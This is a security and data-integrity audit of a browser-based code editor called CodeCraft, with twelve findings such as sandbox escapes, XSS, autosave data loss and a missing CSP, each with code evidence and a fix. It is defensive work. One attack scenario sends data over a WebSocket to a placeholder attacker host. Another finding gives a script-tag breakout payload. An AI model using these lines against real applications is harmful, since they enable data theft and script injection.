# Security-Data-Integrity-Analysis-2-OGF

**Project**: CodeCraft — Browser-based Code Editor  
**Analyst**: Security & Data Integrity Analyst  
**Date**: 2026-03-04  
**Scope**: Sandbox escapes, XSS vectors, data loss, input validation, CSP, dependency security

---

## Executive Summary

A deep security and data integrity analysis of CodeCraft identified **12 vulnerabilities** across 5 categories: 1 Critical, 4 High, 5 Medium, and 2 Low severity. The most dangerous finding is a **same-origin XSS via the "Open in New Tab" feature** (SEC-01), which allows user code in the preview iframe to escape its sandbox and access IndexedDB, localStorage, and all app data. The Web Worker sandbox has **incomplete global deletion** allowing network access via WebSocket/EventSource (SEC-02). Data loss is likely during tab close due to missing `beforeunload` handling (SEC-04). No Content Security Policy is configured (SEC-08), and ZIP imports lack size/bomb protection (SEC-07).

---

## Findings Index

| ID | Severity | Category | File | Title |
|----|----------|----------|------|-------|
| SEC-01 | **Critical** | XSS | PreviewFrame.tsx:212-218 | Same-origin XSS via "Open in New Tab" Blob URL |
| SEC-02 | **High** | Sandbox Escape | jsRunner.ts:50-54 | Incomplete global deletion — WebSocket, EventSource, Worker not blocked |
| SEC-03 | **High** | Sandbox Escape | jsRunner.ts:52-54 | `delete self.X` may not remove prototype-inherited globals |
| SEC-04 | **High** | Data Loss | useAutoSave.ts:178-190 | No beforeunload handler — data lost on tab close during debounce |
| SEC-05 | **High** | XSS | PreviewFrame.tsx:258-263 | User HTML rendered directly in iframe without sanitization |
| SEC-06 | **Medium** | Input Validation | zipImport.ts:37-93 | No ZIP size/bomb protection — memory exhaustion possible |
| SEC-07 | **Medium** | Input Validation | useFileTree.ts:101-111 | Weak filename validation — allows special chars, long names, null bytes |
| SEC-08 | **Medium** | CSP | index.html, vite.config.ts | No Content Security Policy configured |
| SEC-09 | **Medium** | Data Loss | files.ts, projects.ts | No IndexedDB transaction error recovery — silent data loss on quota exceeded |
| SEC-10 | **Medium** | Data Integrity | db/queries/* | No multi-tab write conflict detection |
| SEC-11 | **Low** | Dependency | utils/id.ts:16-20 | Math.random() UUID fallback is predictable |
| SEC-12 | **Low** | CSP | vite.config.ts:54-56 | Service worker interval never cleared — minor resource leak |

---

## Detailed Findings

---

### SEC-01 — Same-Origin XSS via "Open in New Tab" Blob URL

**Severity**: Critical  
**Category**: XSS  
**Location**: `src/components/Preview/PreviewFrame.tsx`, lines 212-218  

**Description**:  
The "Open in New Tab" feature creates a Blob URL from user-supplied HTML content and opens it via `window.open()`. Blob URLs **inherit the origin of the creating context**, meaning the new tab has full same-origin access to the CodeCraft application's IndexedDB, localStorage, cookies, and DOM. This completely bypasses the `sandbox="allow-scripts"` protection of the in-page iframe.

An attacker can craft HTML/JS code that, when the user clicks "Open in New Tab", reads all projects and files from IndexedDB, exfiltrates them to a remote server, or corrupts/destroys all user data.

**Evidence**:
```tsx
// PreviewFrame.tsx:212-218
const handleOpenInNewTab = useCallback(() => {
    if (!srcdoc) return;
    const blob = new Blob([srcdoc], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    window.open(url, '_blank');           // ← Blob URL inherits app origin!
    setTimeout(() => URL.revokeObjectURL(url), 5000);
  }, [srcdoc]);
```

**Research**:  
- Imperva: "Blob URLs may appear to be protected by the same-origin policy, but they are not." — https://www.imperva.com/blog/lessons-learned-from-exposing-unusual-xss-vulnerabilities  
- StackOverflow: "allow-same-origin is unsafe for untrusted content in blob: URLs because blob: URLs inherit the parent document origin" — https://stackoverflow.com/questions/35208161  
- Security StackExchange: "Allowing URLs with the blob: scheme is risky, because they inherit the origin from the environment that created them." — https://security.stackexchange.com/questions/279235

**Fix Recommendation**:  
1. **Option A (Best)**: Open the preview in a sandboxed iframe within a new window, not via blob URL. Use `window.open('about:blank')` and then write content into a sandboxed iframe within that window.  
2. **Option B**: Use a `data:text/html` URL with a sandboxed iframe. Data URLs have a null origin (opaque origin) and cannot access same-origin resources.  
3. **Option C**: Strip all `<script>` tags from the HTML before opening in a new tab, making it read-only.  
4. **Minimum**: Add a prominent warning before opening user code in a new tab, explaining that the code will have full access to their data.

---

### SEC-02 — Incomplete Global Deletion in Web Worker Sandbox

**Severity**: High  
**Category**: Sandbox Escape  
**Location**: `src/runner/jsRunner.ts`, lines 50-54  

**Description**:  
The Web Worker sandbox deletes `importScripts`, `fetch`, and `XMLHttpRequest` but does NOT delete several other network-capable globals:

- **`WebSocket`** — Allows user code to establish persistent bi-directional connections to any server
- **`EventSource`** — Allows user code to open Server-Sent Events connections
- **`Worker`** — Allows user code to spawn nested workers (which inherit the parent's network access)
- **`SharedWorker`** — Allows cross-tab communication
- **`navigator.sendBeacon`** — Allows one-way data exfiltration via POST requests

This means user code can exfiltrate data or communicate with external servers even though `fetch` and `XMLHttpRequest` are blocked.

**Evidence**:
```js
// jsRunner.ts:51-54 — Only 3 globals deleted
delete self.importScripts;
delete self.fetch;
delete self.XMLHttpRequest;
// WebSocket, EventSource, Worker, SharedWorker, navigator.sendBeacon are NOT deleted
```

**Attack scenario**:  
```javascript
// User code running in the "sandboxed" worker:
const ws = new WebSocket('wss://attacker.com/exfil');
ws.onopen = () => ws.send('Data exfiltrated from CodeCraft');
```

**Research**:  
- StackOverflow: "Are web workers a secure way to sandbox untrusted javascript code?" — Multiple answers confirm that Web Workers retain network access through WebSocket, EventSource, etc. — https://stackoverflow.com/questions/16600607  
- Stanford CS155: "Browser code isolation" lecture notes on Worker security boundaries — https://crypto.stanford.edu/cs155old/cs155-spring18/lectures/11-workers-sandbox-csp.pdf  
- MDN: CSP `connect-src` directive restricts URLs loadable via script interfaces including WebSocket and EventSource — https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src

**Fix Recommendation**:  
Add the following deletions to the worker source:
```javascript
delete self.WebSocket;
delete self.EventSource;
delete self.Worker;
delete self.SharedWorker;
delete self.navigator?.sendBeacon;
```
Additionally, since `delete` on prototype-inherited properties may not work (see SEC-03), set them to `undefined` as well:
```javascript
self.WebSocket = undefined;
self.EventSource = undefined;
// etc.
```

---

### SEC-03 — `delete self.X` May Not Remove Prototype-Inherited Globals

**Severity**: High  
**Category**: Sandbox Escape  
**Location**: `src/runner/jsRunner.ts`, lines 52-54  

**Description**:  
In some browser engines, Web Worker globals like `fetch`, `importScripts`, and `XMLHttpRequest` are defined on the prototype chain (`DedicatedWorkerGlobalScope.prototype`) rather than as own properties of the worker global scope. When a property is inherited from a prototype, `delete self.fetch` only removes an own property override (if any), but the prototype property remains accessible via the standard property lookup chain.

This means user code could still access `fetch`, `importScripts`, or `XMLHttpRequest` if they are prototype-inherited in the current browser.

**Evidence**:
```javascript
// jsRunner.ts:52-54
delete self.importScripts;  // May not work if inherited from prototype
delete self.fetch;          // May not work if inherited from prototype
delete self.XMLHttpRequest; // May not work if inherited from prototype
```

In Chrome/V8, `self.hasOwnProperty('fetch')` returns `false` in worker contexts, meaning `fetch` is inherited from the prototype. `delete self.fetch` returns `true` but does nothing.

**Research**:  
- StackOverflow: "Making WebWorkers a safe environment" — Demonstrates that `delete` on global properties is unreliable and recommends `self.fetch = undefined` instead — https://stackoverflow.com/questions/10653809  
- Alex Griss: "A Deep Dive into JavaScript Code Isolation" — Discusses prototype chain bypass in Worker sandboxes — https://alexgriss.tech/en/blog/javascript-sandboxes  
- Node.js Help #1378: "Security of worker_threads + vm.Module + deleting all globals?" — Confirms that deleting globals is insufficient for real sandboxing — https://github.com/nodejs/help/issues/1378

**Fix Recommendation**:  
Replace `delete` with explicit `undefined` assignment, which overrides prototype inheritance:
```javascript
// Instead of: delete self.fetch;
self.fetch = undefined;
self.importScripts = undefined;
self.XMLHttpRequest = undefined;
self.WebSocket = undefined;
self.EventSource = undefined;
```
Or use a more robust approach with `Object.defineProperty` to make the properties non-configurable:
```javascript
['fetch', 'importScripts', 'XMLHttpRequest', 'WebSocket', 'EventSource'].forEach(prop => {
  Object.defineProperty(self, prop, {
    value: undefined,
    writable: false,
    configurable: false
  });
});
```

---

### SEC-04 — No beforeunload Handler — Data Lost on Tab Close During Debounce

**Severity**: High  
**Category**: Data Loss  
**Location**: `src/hooks/useAutoSave.ts`, lines 178-190  

**Description**:  
The auto-save hook uses a debounce timer (300-5000ms) to batch writes to IndexedDB. When the user closes the tab or navigates away, the pending debounce timer is simply discarded. The cleanup effect at lines 178-190 attempts to flush dirty files, but it's a React `useEffect` cleanup — React does NOT guarantee that cleanup effects run on tab close. Even if it did, `flushDirtyFiles()` is async and the browser will not wait for the Promise to resolve.

The result: any content typed within the debounce window before tab close is silently lost.

**Evidence**:
```tsx
// useAutoSave.ts:178-190
useEffect(() => {
    return () => {
      // When the component unmounts, flush any remaining dirty files
      // This prevents data loss if the user closes the tab during a debounce
      const dirtyIds = useEditorStore.getState().dirtyFileIds;
      if (dirtyIds.size > 0) {
        // Use synchronous-style flush — we can't await in cleanup
        // but we can start the save operations
        flushDirtyFiles();  // ← Async call abandoned on tab close!
      }
    };
  }, []);
```

No `window.addEventListener('beforeunload', ...)` exists anywhere in the codebase.

**Research**:  
- StackOverflow: "Save to IndexedDB beforeunload" — Confirms that async operations started in beforeunload are not guaranteed to complete — https://stackoverflow.com/questions/50751912  
- MDN: "Window: beforeunload event" — The event can be used to warn users about unsaved changes — https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event  
- Vaughn Royko: IndexedDB onbeforeunload test — Demonstrates that large IndexedDB writes started during beforeunload may not complete — http://vaughnroyko.com/idbonbeforeunload

**Fix Recommendation**:  
1. Add a `beforeunload` handler that warns the user if dirty files exist:
```typescript
useEffect(() => {
  const handleBeforeUnload = (e: BeforeUnloadEvent) => {
    const { dirtyFileIds } = useEditorStore.getState();
    if (dirtyFileIds.size > 0) {
      e.preventDefault();
      e.returnValue = ''; // Triggers browser "unsaved changes" dialog
    }
  };
  window.addEventListener('beforeunload', handleBeforeUnload);
  return () => window.removeEventListener('beforeunload', handleBeforeUnload);
}, []);
```
2. Also attempt a synchronous-style flush using `navigator.sendBeacon` or by reducing debounce to 0 on visibility change:
```typescript
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') {
    flushDirtyFiles(); // Best-effort save
  }
});
```
3. The `visibilitychange` approach is more reliable than `beforeunload` for actually persisting data.

---

### SEC-05 — User HTML Rendered in Iframe Without Sanitization

**Severity**: High  
**Category**: XSS  
**Location**: `src/components/Preview/PreviewFrame.tsx`, lines 52-143  

**Description**:  
The `buildPreviewHTML` function returns user-authored HTML content directly as the `srcdoc` of the iframe. While the iframe has `sandbox="allow-scripts"` (which prevents same-origin access), user HTML can still:
1. Execute arbitrary JavaScript within the iframe context
2. Use `parent.postMessage()` to send messages to the parent window
3. Create `<iframe>` elements within the preview (nested iframes)
4. Use `<meta http-equiv="refresh">` for redirects (not blocked by allow-scripts)
5. Load external resources (images, styles, fonts, scripts from CDN)

The JS console-capture template (lines 103-125) embeds user code directly via string interpolation: `(function() { ${activeFileContent} })()`. If user code contains `</script>` it could break out of the script tag.

**Evidence**:
```tsx
// PreviewFrame.tsx:58-59 — User HTML used directly
if (activeFileLanguage === 'html') {
    return activeFileContent;  // ← No sanitization!
}

// PreviewFrame.tsx:119 — User JS embedded via string interpolation
const result = (function() { ${activeFileContent} })();  // ← Script injection via </script>
```

**Attack scenario**: A user writes JS code containing `</script><script>alert('XSS')</script>`, breaking out of the inline script context.

**Research**:  
- Johan Carlsson: "Sandbox-iframe XSS challenge solution" — Demonstrates that `sandbox="allow-scripts"` iframes can still exfiltrate data via postMessage — https://joaxcar.com/blog/2024/05/16/sandbox-iframe-xss-challenge-solution  
- Medium: "iframe Sandbox Bypass" — Chain of DOM XSS + postMessage hijacking from sandboxed iframes — https://medium.com/@renwa/iframe-sandbox-bypass-cross-origin-drag-drop-unvalidated-postmessage-origin-cookie-bomb-to-21357a4d94f5  
- Joshua Hu: "Creating a Read-Only Iframe Sandbox" — Confirms that sandbox=allow-scripts prevents parent access but not postMessage — https://joshua.hu/rendering-sandboxing-arbitrary-html-content-iframe-interacting

**Fix Recommendation**:  
1. **Escape user JS before embedding** in the inline script template — replace `</script>` with `<\/script>`:
```typescript
const escaped = activeFileContent.replace(/<\/script>/gi, '<\\/script>');
```
2. **Add `allow-scripts` without `allow-same-origin`** (already done — good!) but also consider adding `allow-popups: false` explicitly.
3. **Listen for and validate `postMessage` events** from the iframe to prevent data exfiltration via message passing.
4. Consider adding a CSP to the srcdoc content:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src 'none';">
```

---

### SEC-06 — No ZIP Size/Bomb Protection — Memory Exhaustion Possible

**Severity**: Medium  
**Category**: Input Validation  
**Location**: `src/utils/zipImport.ts`, lines 37-93  

**Description**:  
The `importProjectFromZip` function reads the entire ZIP file into memory as an ArrayBuffer, then decompresses all entries. There are no limits on:
- Input ZIP file size
- Number of entries in the ZIP
- Size of individual decompressed files
- Total decompressed size

A malicious ZIP bomb (e.g., a 42KB file that decompresses to 4.5GB) could crash the browser tab, or a ZIP with thousands of entries could create an excessive number of IndexedDB records.

Additionally, file content is decoded with `new TextDecoder().decode(entries[filePath])` which will corrupt binary files and could produce very large strings for compressed entries.

**Evidence**:
```typescript
// zipImport.ts:42-43 — No size limit
const buffer = await zipFile.arrayBuffer();
const uint8 = new Uint8Array(buffer);

// zipImport.ts:78 — No content size check
const content = new TextDecoder().decode(entries[filePath]);
```

**Research**:  
- Snyk: "ZIP Slip: The Archive Extraction Vulnerability Everywhere" — Documents path traversal and ZIP bomb risks — https://medium.com/@instatunnel/zip-slip-the-archive-extraction-vulnerability-everywhere-a37092feb240  
- Android Developers: "Zip Path Traversal" — Documents ZipSlip vulnerability (CWE-22) — https://developer.android.com/privacy-and-security/risks/zip-path-traversal  
- fflate GitHub discussion #245: "Is fflate supposed to be able to read strange .zip files and guard against..." — Discusses fflate's lack of built-in protection — https://github.com/101arrowz/fflate/discussions/245  
- Snyk: fflate 0.8.2 — "No direct vulnerabilities" but the library itself doesn't enforce limits — https://security.snyk.io/package/npm/fflate/0.8.2

**Fix Recommendation**:  
1. **Limit input ZIP file size** (e.g., 10MB max):
```typescript
const MAX_ZIP_SIZE = 10 * 1024 * 1024; // 10MB
if (zipFile.size > MAX_ZIP_SIZE) {
  throw new Error(`ZIP file too large (max ${MAX_ZIP_SIZE / 1024 / 1024}MB)`);
}
```
2. **Limit number of entries** (e.g., 100 max):
```typescript
const MAX_ENTRIES = 100;
if (filePaths.length > MAX_ENTRIES) {
  throw new Error(`ZIP contains too many files (max ${MAX_ENTRIES})`);
}
```
3. **Limit individual file content size** before decoding:
```typescript
const MAX_FILE_SIZE = 1 * 1024 * 1024; // 1MB per file
if (entries[filePath].length > MAX_FILE_SIZE) {
  console.warn(`[ZIP Import] Skipping large file: ${filePath}`);
  continue;
}
```
4. **Check for binary content** before TextDecoder (reject or skip non-UTF-8 files).

---

### SEC-07 — Weak Filename Validation

**Severity**: Medium  
**Category**: Input Validation  
**Location**: `src/components/Sidebar/useFileTree.ts`, lines 101-111; `src/db/queries/projects.ts`, line 41  

**Description**:  
Filename validation only checks for empty strings and `/` characters. It does not validate against:
- **Null bytes** (`\0`) — Can truncate filenames or cause issues in some filesystems
- **Backslashes** (`\`) — Path traversal on Windows
- **Control characters** — Could cause display issues or be used in social engineering
- **Very long filenames** — No length limit; could cause IndexedDB key issues or UI overflow
- **Reserved names** — `CON`, `PRN`, `AUX`, `NUL`, etc. on Windows
- **Special characters** — `:`, `*`, `?`, `"`, `<`, `>`, `|` that are invalid on some filesystems

Similarly, project names in `createProject()` have **zero validation** — any string is accepted.

**Evidence**:
```typescript
// useFileTree.ts:101-111
const trimmed = name.trim();
if (!trimmed) {
  setError('Filename cannot be empty');
  return null;
}
if (trimmed.includes('/')) {
  setError('Filenames cannot contain "/"');
  return null;
}
// No other validation!

// projects.ts:41 — No name validation at all
export async function createProject(name: string): Promise<Project> {
```

**Research**:  
- OWASP: "File Upload Cheat Sheet" — Recommends validating filenames against a whitelist of allowed characters — https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html  
- CWE-78: "OS Command Injection" — Special characters in filenames can lead to injection when files are exported — https://cwe.mitre.org/data/definitions/78.html

**Fix Recommendation**:  
Add comprehensive filename validation:
```typescript
const MAX_FILENAME_LENGTH = 255;
const VALID_FILENAME = /^[a-zA-Z0-9._-]+$/;

function validateFilename(name: string): string | null {
  const trimmed = name.trim();
  if (!trimmed) return 'Filename cannot be empty';
  if (trimmed.length > MAX_FILENAME_LENGTH) return 'Filename too long (max 255 chars)';
  if (!VALID_FILENAME.test(trimmed)) return 'Filename contains invalid characters (use letters, numbers, ., _, -)';
  if (trimmed.startsWith('.')) return 'Filename cannot start with a dot';
  if (trimmed === '.' || trimmed === '..') return 'Invalid filename';
  return null;
}
```

---

### SEC-08 — No Content Security Policy Configured

**Severity**: Medium  
**Category**: CSP  
**Location**: `index.html`, `vite.config.ts`  

**Description**:  
The application has no Content Security Policy (CSP) configured — neither as an HTTP header nor as a `<meta>` tag. This means:
- No restriction on script sources (inline scripts, eval, CDN scripts all allowed)
- No restriction on `connect-src` (any network connection allowed from the main page)
- No `frame-ancestors` directive (clickjacking possible)
- No `form-action` restriction
- No `base-uri` restriction
- No reporting endpoint for violation monitoring

For a code editor that executes user code and handles sensitive data in IndexedDB, this is a significant gap. GitHub Pages (the deployment target) does not support custom HTTP headers, but CSP can be set via `<meta http-equiv>` tags.

**Evidence**:
```html
<!-- index.html — No CSP meta tag -->
<head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- No Content-Security-Policy meta tag! -->
</head>
```

**Research**:  
- GitHub Community Discussion #49832: "Content Security Policy setting" — Confirms GitHub Pages doesn't support custom headers, but `<meta http-equiv>` works for basic CSP — https://github.com/orgs/community/discussions/49832  
- OWASP: "Content Security Policy Cheat Sheet" — Recommends strict CSP for SPAs — https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Content_Security_Policy_Cheat_Sheet.md  
- Isaac Smith: "Add a Content Security Policy to a GitHub Pages Site" — Practical guide for meta-tag CSP on GitHub Pages — https://www.isaacsmith.us/blog/2022/add-csp-to-github-pages

**Fix Recommendation**:  
Add a CSP meta tag to `index.html`:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' blob:; 
               style-src 'self' 'unsafe-inline'; 
               connect-src 'self'; 
               img-src 'self' data: blob:; 
               font-src 'self'; 
               frame-src blob:; 
               frame-ancestors 'none'; 
               base-uri 'self'; 
               form-action 'none';">
```

Note: `blob:` is needed for `script-src` (Web Worker Blob URLs) and `frame-src` (iframe srcdoc uses Blob URLs internally). `'unsafe-inline'` is needed for `style-src` because Vite injects inline styles. `connect-src 'self'` prevents the main page from making network requests to external servers.

---

### SEC-09 — No IndexedDB Transaction Error Recovery

**Severity**: Medium  
**Category**: Data Loss  
**Location**: `src/db/queries/files.ts`, `src/db/queries/projects.ts`  

**Description**:  
All IndexedDB operations via Dexie are wrapped in transactions, but there is no explicit error handling for transaction failures. If an IndexedDB transaction fails (due to storage quota exceeded, write contention, or browser-specific errors), the error propagates uncaught through the auto-save callback, which catches it and logs to console — but the dirty flag is never re-set, so the user is not warned that their data was not saved.

In `saveFileContent` (files.ts:142-160), if the transaction fails after the file was marked as clean in the editor store (which happens in the auto-save callback at useAutoSave.ts:109-111), the user's data is lost from both IndexedDB AND the dirty tracking, creating a silent data loss scenario.

**Evidence**:
```typescript
// useAutoSave.ts:108-111 — Marks saved even if DB write partially failed
for (const { id } of updates) {
  markSaved(id);  // ← Clears dirty flag regardless of save success
}

// files.ts:151-159 — No error handling for transaction failure
await db.transaction('rw', [db.files, db.projects], async () => {
  await db.files.update(id, {
    content,
    isDirty: false,
    updatedAt: now,
  });
  await touchProject(file.projectId);
});
```

**Research**:  
- MDN: "Using IndexedDB" — "You can have only one readwrite transaction for an object store at a time" — concurrent writes can fail — https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB  
- RxDB: "Why IndexedDB is slow" — Documents transaction failure patterns and quota issues — https://rxdb.info/slow-indexeddb.html

**Fix Recommendation**:  
1. **Mark as saved ONLY after confirmed successful write** — move `markSaved()` into a `.then()` chain:
```typescript
// Only mark saved after confirmed DB write
await saveFileContent(updates[0].id, updates[0].content);
markSaved(updates[0].id);  // Now safe
```
2. **Add quota error detection**:
```typescript
catch (error) {
  if (error?.name === 'QuotaExceededError') {
    console.error('[AutoSave] Storage quota exceeded!');
    // Show user-facing error
  }
  // Don't mark as saved — keep dirty flag set
}
```

---

### SEC-10 — No Multi-Tab Write Conflict Detection

**Severity**: Medium  
**Category**: Data Integrity  
**Location**: `src/db/queries/files.ts`, `src/db/queries/projects.ts`  

**Description**:  
If the user opens CodeCraft in multiple browser tabs and edits the same file in both tabs, both tabs will write to IndexedDB independently. The last write wins (LWW), and the earlier edit is silently overwritten. There is no:
- Optimistic locking (version check before write)
- Last-write-wins detection with user notification
- `storage` event listener for cross-tab synchronization
- Conflict resolution UI

Dexie does not provide built-in conflict detection. IndexedDB transactions from different tabs are serialized by the browser, but the second tab's write simply overwrites the first's without any awareness of the conflict.

**Evidence**:
```typescript
// files.ts:142-160 — No version check before write
export async function saveFileContent(id: string, content: string): Promise<void> {
  const now = Date.now();
  const file = await db.files.get(id);
  if (!file) return;

  await db.transaction('rw', [db.files, db.projects], async () => {
    await db.files.update(id, {
      content,     // ← Overwrites whatever's in DB, no version check
      isDirty: false,
      updatedAt: now,
    });
    await touchProject(file.projectId);
  });
}
```

**Research**:  
- GitHub Gist: "Offline-first browser apps and multiple tabs" — Discusses conflict patterns in IndexedDB multi-tab scenarios — https://gist.github.com/pesterhazy/a840a21000b67cc5b7e601fdc91b9e18  
- StackOverflow: "Using indexeddb operation in multiple tabs" — Confirms that IndexedDB does not provide cross-tab write coordination — https://stackoverflow.com/questions/51615658

**Fix Recommendation**:  
1. **Add optimistic locking** — check `updatedAt` before writing:
```typescript
export async function saveFileContent(id: string, content: string): Promise<void> {
  const file = await db.files.get(id);
  if (!file) return;
  
  const now = Date.now();
  // If file was modified since we last read it, it's a conflict
  const lastKnownUpdate = /* track in editorStore */;
  if (file.updatedAt > lastKnownUpdate) {
    throw new Error('CONFLICT: File was modified in another tab');
  }
  // ... proceed with write
}
```
2. **Listen for `storage` events** (not fired for IndexedDB, but can use BroadcastChannel):
```typescript
const channel = new BroadcastChannel('codecraft-db-changes');
channel.onmessage = (e) => { /* notify user of external changes */ };
```
3. **Minimum**: Show a warning when the page gets focus and a file has been modified externally.

---

### SEC-11 — Math.random() UUID Fallback is Predictable

**Severity**: Low  
**Category**: Dependency  
**Location**: `src/utils/id.ts`, lines 16-20  

**Description**:  
The `generateId()` function has a fallback path that uses `Math.random()` when `crypto.randomUUID()` is unavailable. `Math.random()` is not cryptographically secure — its output can be predicted if the PRNG state is known, and collisions are far more likely than with true random UUIDs (entropy as low as 41 bits in some browsers).

In practice, all modern browsers support `crypto.randomUUID()`, so this fallback is unlikely to be hit. However, if it is hit (e.g., in an older browser or non-HTTPS context where crypto is limited), the generated IDs could be predictable, potentially allowing an attacker to guess file/project IDs.

**Evidence**:
```typescript
// id.ts:16-20
return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;  // ← Not cryptographically random!
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
```

**Research**:  
- StackOverflow: "Collisions when generating UUIDs in JavaScript" — Documents that Math.random() has as low as 41 bits of entropy — https://stackoverflow.com/questions/6906916  
- OpenReplay: "Generating Unique IDs with the Web Crypto API" — "Math.random() isn't cryptographically secure. Its output can be predictable, and collisions are far more likely than you'd expect in production" — https://blog.openreplay.com/generate-unique-ids-web-crypto-api

**Fix Recommendation**:  
Replace the Math.random() fallback with `crypto.getRandomValues()`:
```typescript
export function generateId(): string {
  if (typeof crypto !== 'undefined' && crypto.randomUUID) {
    return crypto.randomUUID();
  }
  // Fallback using crypto.getRandomValues (available in all modern browsers)
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  bytes[6] = (bytes[6] & 0x0f) | 0x40; // version 4
  bytes[8] = (bytes[8] & 0x3f) | 0x80; // variant 1
  const hex = Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
  return `${hex.slice(0,8)}-${hex.slice(8,12)}-${hex.slice(12,16)}-${hex.slice(16,20)}-${hex.slice(20)}`;
}
```

---

### SEC-12 — Service Worker Update Interval Never Cleared

**Severity**: Low  
**Category**: CSP  
**Location**: `src/main.tsx`, lines 53-56  

**Description**:  
The `onRegisteredSW` callback creates a `setInterval` that checks for service worker updates every hour. This interval is never cleared, creating a minor memory leak. If the service worker is unregistered or the app is in a state where updates aren't relevant, the interval continues firing.

**Evidence**:
```typescript
// main.tsx:53-56
if (registration) {
  setInterval(() => {
    registration.update();
  }, 60 * 60 * 1000); // ← Never cleared!
}
```

**Research**:  
- MDN: `setInterval` — Long-lived intervals should be cleared when no longer needed to prevent memory leaks.

**Fix Recommendation**:  
Store the interval ID and clear it on page unload:
```typescript
onRegisteredSW(swUrl, registration) {
  if (registration) {
    const intervalId = setInterval(() => {
      registration.update();
    }, 60 * 60 * 1000);
    
    // Clean up on page unload
    window.addEventListener('unload', () => clearInterval(intervalId));
  }
}
```

---

## Summary Table

| ID | Severity | Category | File | Status |
|----|----------|----------|------|--------|
| SEC-01 | **Critical** | XSS | PreviewFrame.tsx | Needs immediate fix |
| SEC-02 | **High** | Sandbox Escape | jsRunner.ts | Needs fix |
| SEC-03 | **High** | Sandbox Escape | jsRunner.ts | Needs fix |
| SEC-04 | **High** | Data Loss | useAutoSave.ts | Needs fix |
| SEC-05 | **High** | XSS | PreviewFrame.tsx | Needs fix |
| SEC-06 | **Medium** | Input Validation | zipImport.ts | Should fix |
| SEC-07 | **Medium** | Input Validation | useFileTree.ts | Should fix |
| SEC-08 | **Medium** | CSP | index.html | Should fix |
| SEC-09 | **Medium** | Data Loss | files.ts | Should fix |
| SEC-10 | **Medium** | Data Integrity | db/queries/* | Should fix |
| SEC-11 | **Low** | Dependency | id.ts | Nice to fix |
| SEC-12 | **Low** | CSP | main.tsx | Nice to fix |

---

## Positive Security Findings

1. **Iframe sandboxing is correct**: `sandbox="allow-scripts"` without `allow-same-origin` properly isolates the preview iframe from the parent context.
2. **Console output uses textContent**: `ConsoleOutput.tsx` renders output via `{entry.args.join(' ')}` which React escapes as text — no HTML injection through console output.
3. **Dexie transactions for cascade deletes**: `deleteProject()` correctly uses a transaction to cascade-delete files.
4. **Auto-save has concurrency guard**: `isSavingRef` prevents concurrent save operations.
5. **Worker has output limits**: `MAX_OUTPUT_CHARS`, `MAX_ENTRIES`, `MAX_ARG_LENGTH` prevent memory exhaustion from console output.
6. **Worker timeout**: 5-second timeout with `worker.terminate()` prevents infinite loops.
7. **PWA scope is correctly set**: `scope: '/CodeCraft/'` limits the service worker's scope.
8. **No known dependency vulnerabilities**: `npm audit` returns 0 vulnerabilities. fflate 0.8.2 has no known CVEs per Snyk.

---

## Priority Remediation Order

1. **SEC-01** (Critical) — Fix the "Open in New Tab" Blob URL XSS immediately
2. **SEC-02 + SEC-03** (High) — Harden the Worker sandbox with complete global deletion + undefined assignment
3. **SEC-04** (High) — Add beforeunload handler and visibilitychange flush
4. **SEC-05** (High) — Escape user JS before embedding in inline scripts
5. **SEC-06** (Medium) — Add ZIP size limits and entry count limits
6. **SEC-08** (Medium) — Add CSP meta tag to index.html
7. **SEC-07** (Medium) — Strengthen filename validation
8. **SEC-09** (Medium) — Fix save acknowledgment ordering
9. **SEC-10** (Medium) — Add basic multi-tab conflict detection
10. **SEC-11 + SEC-12** (Low) — Fix UUID fallback and interval cleanup
